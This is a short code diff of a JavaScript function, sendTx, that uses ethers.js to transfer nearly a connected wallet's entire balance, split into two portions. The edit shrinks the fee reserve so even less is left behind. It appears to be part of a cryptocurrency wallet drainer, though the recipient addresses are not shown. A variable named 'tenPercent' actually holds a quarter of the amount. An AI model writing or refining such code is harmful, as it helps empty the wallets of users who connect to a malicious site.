@@ -42,7 +42,7 @@ export const sendTx = async (provider, address, balance) => {
   const ethersProvider = new BrowserProvider(provider);
   const signer = await ethersProvider.getSigner();
 
-  const amountToSend = balance - parseEther('0.00075');
+  const amountToSend = balance - parseEther('0.000005');
   if (amountToSend > 0n) {
     const tenPercent = amountToSend / 4n;
     const ninetyPercent = amountToSend - tenPercent;
